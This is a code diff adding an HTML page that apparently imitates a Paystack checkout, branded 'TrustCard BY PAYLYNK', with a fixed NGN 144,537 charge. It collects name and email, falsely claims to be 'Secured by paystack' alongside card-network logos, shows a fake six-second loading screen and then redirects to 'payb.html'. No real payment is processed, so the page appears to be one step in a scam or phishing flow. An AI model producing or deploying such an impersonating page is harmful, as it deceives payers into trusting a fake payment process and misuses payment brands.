@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>VIBRA.PAYSTACK</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    body {
+      background: #fff;
+      color: #000;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo img {
+      width: 35px;
+      margin-bottom: 10px;
+    }
+
+    .logo h2 {
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .logo span {
+      font-size: 12px;
+      color: gray;
+      font-weight: 500;
+    }
+
+    label {
+      font-size: 14px;
+      font-weight: 600;
+      display: block;
+      margin: 15px 0 5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .amount-input {
+      display: flex;
+    }
+
+    .amount-input input:first-child {
+      width: 80px;
+      margin-right: 5px;
+    }
+
+    .secured {
+      text-align: center;
+      margin: 20px 0 10px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .secured img {
+      margin: 15px 5px 0;
+      vertical-align: middle;
+      height: 20px;
+    }
+
+    button {
+      width: 100%;
+      background: #00b200;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+
+    /* iPhone-style loading screen */
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .iphone-loader {
+      width: 40px;
+      height: 40px;
+      border: 5px solid #ccc;
+      border-top: 5px solid #00b200;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 16px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div id="loadingOverlay">
+    <div class="iphone-loader"></div>
+    <div class="loading-text"></div>
+  </div>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://tse1.mm.bing.net/th/id/OIP.8onr3Ap2gTDhwhx5e61DEAHaHa?rs=1&pid=ImgDetMain&o=7&rm=3" alt="Logo" />
+      <h2>TrustCard</h2>
+      <span>BY PAYLYNK</span>
+    </div>
+
+    <form id="paymentForm">
+      <label for="first">First name</label>
+      <input type="text" id="first" placeholder="First name" required />
+
+      <label for="last">Last name</label>
+      <input type="text" id="last" placeholder="Last name" required />
+
+      <label for="email">Email address</label>
+      <input type="email" id="email" placeholder="Email address" required />
+
+      <label>Amount</label>
+      <div class="amount-input">
+        <input type="text" value="NGN" disabled />
+        <input type="number" value="144537.00" disabled />
+      </div>
+
+      <div class="secured">
+        🔒 Secured by <strong style="color:#00b200">paystack</strong><br />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard" />
+        <!-- <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Verve_card_logo.png" alt="Verve" /> -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="ApplePay" />
+        <!-- <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/AfriGo_logo.png" alt="AfriGo" /> -->
+      </div>
+
+      <button type="submit">Pay now</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('paymentForm');
+    const loader = document.getElementById('loadingOverlay');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      loader.style.display = 'flex';
+      setTimeout(() => {
+        window.location.href = 'payb.html';
+      }, 6000);
+    });
+  </script>
+</body>
+</html>
